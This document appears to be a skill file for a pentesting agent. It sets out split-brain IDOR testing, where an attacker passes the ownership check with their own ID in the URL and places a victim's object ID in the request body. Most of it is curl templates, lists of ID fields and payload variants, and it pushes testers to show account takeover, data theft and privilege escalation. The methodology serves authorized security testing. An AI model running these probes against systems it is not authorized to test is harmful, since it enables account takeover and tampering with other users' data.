---
name: split-brain-idor
description: Test for body/route parameter divergence where the server uses a different object identifier than the one validated in the URL path
origin: Vigil
---

# Split-Brain IDOR Testing

> **`vigil assess kali` audit flags:** use `--technique IDOR` for all split-brain identity probes. Use `--probe-kind payload` for divergence testing, `--probe-kind exploit` for confirmed unauthorized access demonstrations.

## When to Activate

- API uses RESTful routes with IDs in the path (`PUT /orders/:orderId`)
- Request bodies also contain ID fields (`{"_id": "...", "orderId": "..."}`)
- Application uses a BFF or proxy layer that may route based on URL but forward body to backend
- MongoDB-backed applications (ObjectId in both route and body is common)
- Any PUT/PATCH/POST endpoint where both the URL and body reference the same object

## Core Concept

A split-brain IDOR occurs when:

1. The URL path contains an object ID (used for routing/authorization checks)
2. The request body ALSO contains an object ID (used for the actual database operation)
3. The server validates authorization against the URL ID but operates on the body ID
4. An attacker supplies their own ID in the URL (passes auth) but a victim's ID in the body (hits victim's object)

This is distinct from standard IDOR because the application may correctly enforce "does this user own object X?" on the URL parameter — but then ignores that check and uses the body parameter for the actual write.

## Tools

- `vigil assess kali exec -- curl ...` for all probing (mandatory audit pipeline)
- Two test accounts with distinct object IDs
- Mitmproxy or browser DevTools for observing request/response shapes

---

## Phase 1: Identify Candidate Endpoints

### 1.1 Find PUT/PATCH Endpoints with Body IDs

Look for patterns where the body repeats an identifier from the URL:

```
PUT /api/orders/ORDER_A_ID
Body: {"_id": "ORDER_A_ID", "status": "shipped", ...}

PATCH /api/users/USER_A_ID
Body: {"id": "USER_A_ID", "email": "new@email.com", ...}

POST /api/projects/PROJ_A_ID/update
Body: {"projectId": "PROJ_A_ID", "name": "New Name", ...}
```

**Candidate signals:**
- [ ] PUT/PATCH endpoint with route param AND body contains `_id`, `id`, `objectId`, `resourceId`
- [ ] Response echoes back an ID that came from the body (not the URL)
- [ ] MongoDB ObjectId format (24-char hex) in both URL and body
- [ ] Application uses Express/Node.js (common pattern in Mongoose/MongoDB apps)

### 1.2 Map ID Field Names

Different applications use different body ID field names:

```
_id              (MongoDB native)
id               (Generic REST)
objectId         (Custom)
resourceId       (Custom)
orderId          (Domain-specific)
userId           (Domain-specific)
documentId       (Domain-specific)
entityId         (Generic)
uuid             (UUID-based)
pk, primary_key  (Django-style)
```

### 1.3 Generate the Body-ID Payload Set

You always have your own object's ID and (ideally) the victim's. To probe the divergence
thoroughly — not just the bare victim ID but case/format/structure confusions that may slip past
a `body._id === req.params.id` equality check — classify your own ID and reuse its variants in
the body slot:

```bash
# Mongo ObjectId (24-char hex) → format + boundary confusions to try in the body
vigil assess classify-payload 6512a1f4e3b9c8a7d2f01b3e --mutations
#   type: hex
#   format:   '"6512a1f4e3b9c8a7d2f01b3e"'  '6512a1f4e3b9c8a7d2f01b3e=='  (truncated)  null
#   boundary: '' 'a' (255×a)

# Numeric or UUID id → escalation variants surface the first/admin object directly
vigil assess classify-payload 1042 --mutations          # escalation: '1' '0' 'admin' ...
```

- The **victim's real ID** is your primary body payload (Phase 2) — `classify-payload` cannot
  guess an opaque value you can only observe, but its `escalation` intent does surface the
  well-known first/admin object IDs (`1`, `00000000-...-000000000001`) worth trying when you have
  no second account.
- The `format` variants (`"id"` as string, `[id]` array, `null`) test whether the server's
  ID-equality guard only compares scalars — a string-vs-number mismatch can defeat
  `body._id === req.params.id` while still resolving the same object in the database layer.

---

## Phase 2: Divergence Testing

### 2.1 Basic Split-Brain Test

**Setup:** User A owns Object A. User B owns Object B.

```bash
# Step 1: Baseline — User A updates their own object (should succeed)
curl -X PUT https://target/api/orders/OBJECT_A_ID \
  -H "Cookie: session=USER_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"_id": "OBJECT_A_ID", "status": "updated"}'
# Expected: 200 OK, Object A updated

# Step 2: Standard IDOR test — User A targets User B's object via URL
curl -X PUT https://target/api/orders/OBJECT_B_ID \
  -H "Cookie: session=USER_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"_id": "OBJECT_B_ID", "status": "updated"}'
# Expected if IDOR-protected: 403 Forbidden (User A doesn't own Object B)

# Step 3: SPLIT-BRAIN TEST — User A's URL (passes auth) + User B's body (hits B's data)
curl -X PUT https://target/api/orders/OBJECT_A_ID \
  -H "Cookie: session=USER_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"_id": "OBJECT_B_ID", "status": "hacked"}'
# VULNERABLE if: 200 OK and Object B is modified
# The URL passes ownership check (User A owns A), but the body ID hits Object B
```

### 2.2 Variant: Body ID Different from Route ID

Test multiple field names in the body:

```bash
# Try various body ID field names
for field in "_id" "id" "objectId" "orderId" "userId" "documentId"; do
  curl -X PUT https://target/api/orders/OBJECT_A_ID \
    -H "Cookie: session=USER_A_TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"$field\": \"OBJECT_B_ID\", \"status\": \"test\"}"
done
```

### 2.3 Variant: Missing Body ID (Fallback Behavior)

```bash
# What happens when body ID is omitted?
curl -X PUT https://target/api/orders/OBJECT_A_ID \
  -H "Cookie: session=USER_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status": "test"}'
# Does the server use the URL ID as fallback? If so, normal behavior is URL-based,
# but including a body ID may override it.
```

### 2.4 Variant: Nested Object IDs

Some APIs have nested object references:

```bash
# Nested object override
curl -X PUT https://target/api/orders/OBJECT_A_ID \
  -H "Cookie: session=USER_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"_id": "OBJECT_A_ID", "customer": {"_id": "VICTIM_CUSTOMER_ID"}, "status": "test"}'

# Array of nested objects with IDs
curl -X PUT https://target/api/orders/OBJECT_A_ID \
  -H "Cookie: session=USER_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"_id": "OBJECT_A_ID", "items": [{"_id": "VICTIM_ITEM_ID", "quantity": 0}]}'
```

---

## Phase 3: Confirm Impact

### 3.1 Verify the Write Landed on Victim's Object

```bash
# As User B (the victim), check if their object was modified
curl https://target/api/orders/OBJECT_B_ID \
  -H "Cookie: session=USER_B_TOKEN"
# If status shows "hacked" → confirmed write to victim's object

# Or as User A, if the endpoint allows reading by ID:
curl https://target/api/orders/OBJECT_B_ID \
  -H "Cookie: session=USER_A_TOKEN"
```

### 3.2 Demonstrate Meaningful Impact

Don't stop at "I changed a status field." Demonstrate:

- [ ] **Data theft**: Read victim's sensitive fields by triggering a response that includes them
- [ ] **Account takeover**: Change victim's email/password via body ID override
- [ ] **Financial impact**: Modify order amounts, transfer ownership, change payment details
- [ ] **Privilege escalation**: Change victim's role field to elevate attacker's access

### 3.3 Scale Check

- [ ] Does the vulnerability work across all objects of this type?
- [ ] Does it work on other endpoint types (PATCH, DELETE)?
- [ ] Does it work on related objects (orders → invoices → payments)?

---

## Phase 4: Advanced Variants

### 4.1 Create Operations (POST)

```bash
# POST that creates an object "for" another user
curl -X POST https://target/api/orders \
  -H "Cookie: session=USER_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"userId": "VICTIM_USER_ID", "items": [...], "total": 0}'
# Creates an order owned by the victim? Or billed to the victim?
```

### 4.2 Bulk Operations

```bash
# Bulk update with mixed IDs
curl -X PATCH https://target/api/orders/bulk \
  -H "Cookie: session=USER_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"ids": ["OBJECT_A_ID", "OBJECT_B_ID"], "status": "cancelled"}'
```

### 4.3 GraphQL Mutations

```graphql
mutation {
  updateOrder(id: "OBJECT_A_ID") {  # Auth check on this ID
    id
    status
  }
}
# But the resolver uses a different field internally
```

---

## What to Record

- Endpoint (method + path) and the specific body field that overrides the route parameter
- The authorization model: what the route ID checked vs what the body ID accessed
- Proof of cross-user impact: show Object B was modified while authenticated as User A
- Verify the URL-based auth check passes (this is what makes it a split-brain, not just a standard IDOR)
- Attacker outcome: what data was accessed/modified on the victim's object
- Severity:
  - **Critical**: Body ID override enables account takeover (email/password change on victim)
  - **High**: Body ID override enables reading/modifying victim's sensitive data (PII, financial)
  - **Medium**: Body ID override enables modifying non-sensitive fields on victim's objects
  - **Low**: Divergence confirmed but no meaningful cross-user impact (e.g., only affects own data shape)

## Kill Signals — Stop Testing When

- Body ID and URL ID must match (server validates `body._id === req.params.id`) → no divergence possible
- Body ID is ignored entirely (removing it produces identical behavior) → server uses URL ID only
- Body ID override produces a 400 or validation error mentioning "ID mismatch" → explicitly checked
- Standard IDOR test (Step 2) already succeeds → this is a regular IDOR, not a split-brain variant

## Escalate When

- URL auth check passes but body ID hits a different object → confirmed split-brain, test all PUT/PATCH endpoints
- Same pattern exists on user-profile or account-settings endpoints → account takeover vector
- The application uses a shared middleware pattern (same BFF proxy for all endpoints) → the vulnerability likely exists on EVERY endpoint that accepts body IDs
- Nested object IDs inside arrays are also affected → batch manipulation of victim's sub-resources

## Relationship to Standard IDOR Testing

This skill is a **supplement** to `idor-testing/SKILL.md`, not a replacement. Run standard IDOR tests first. If standard IDOR is blocked (server returns 403 when you change the URL ID), THEN test split-brain: keep your own ID in the URL but put the victim's ID in the body.

## Extended Resources

- `agent/references/api-security/API01-broken-object-level-authz.md` — OWASP BOLA context
- `agent/skills/idor-testing/SKILL.md` — Standard IDOR methodology (run first)
